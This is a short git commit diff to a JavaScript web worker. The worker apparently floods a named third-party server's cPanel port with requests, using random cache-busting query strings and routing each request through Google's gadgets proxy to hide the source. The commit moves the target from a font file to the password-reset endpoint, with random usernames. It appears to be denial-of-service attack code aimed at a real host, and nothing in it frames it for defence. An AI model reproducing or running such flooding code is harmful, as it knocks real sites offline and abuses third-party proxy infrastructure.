f487e78e31367150a7c8856257a0d001896dcb33
Yusuf Dolu <38819540+yusufdolu60@users.noreply.github.com>
2018-05-04 04:32:35 +0300

    Update worker.js

--- worker.js
+++ worker.js
@@ -4,7 +4,7 @@ self.addEventListener('message', function(e) {
 
 	setInterval(function() {
 
-		var target = 'https://server.enucuzanerede.com:2083/cPanel_magic_revision_1386192031/unprotected/cpanel/fonts/open_sans/OpenSans-Bold-webfont.woff?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+		var target = 'https://server.enucuzanerede.com:2083/resetpass?start=1&user='+Math.random().toString(36).substr(2, 7)+'&'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
 
 		var url = 'https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';
 
